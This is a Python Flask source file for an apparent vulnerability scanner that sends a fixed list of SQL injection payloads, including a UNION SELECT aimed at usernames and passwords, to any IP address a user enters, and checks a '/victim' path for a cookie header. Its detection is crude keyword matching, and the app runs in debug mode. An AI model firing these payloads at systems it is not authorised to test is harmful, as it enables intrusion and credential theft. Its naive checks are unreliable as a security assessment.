from flask import Flask, request, render_template, jsonify
import requests

app = Flask(__name__)

# SQL Injection payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "1' OR '1'='1",
    "' UNION SELECT null, null, null -- ",
    "' UNION SELECT username, password FROM users -- ",
]


@app.route('/')
def index():
    """Render the main page"""
    return render_template('index.html')


@app.route('/detect', methods=['POST'])
def detect():
    """Automatically detect SQL Injection and Cookie Stealing risks"""
    ip_address = request.form.get('ip_address')
    sql_results = []
    cookie_results = {}

    # Detect SQL Injection
    for payload in sql_payloads:
        try:
            url = f"http://{ip_address}/test?input={payload}"
            response = requests.get(url, timeout=5)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                sql_results.append({"payload": payload, "status": "Vulnerable"})
            else:
                sql_results.append({"payload": payload, "status": "Safe"})
        except Exception as e:
            sql_results.append({"payload": payload, "status": f"Error: {e}"})

    # Detect Cookie Stealing
    try:
        cookie_url = f"http://{ip_address}/victim"
        cookie_response = requests.get(cookie_url, timeout=5)
        if "test_cookie" in cookie_response.headers.get("Set-Cookie", ""):
            cookie_results = {"status": "Vulnerable", "message": "Cookies can be stolen via JavaScript."}
        else:
            cookie_results = {"status": "Safe", "message": "Cookies are secure or not accessible."}
    except Exception as e:
        cookie_results = {"status": "Error", "message": str(e)}

    return render_template('report.html', sql_results=sql_results, cookie_results=cookie_results)


if __name__ == '__main__':
    app.run(debug=True)
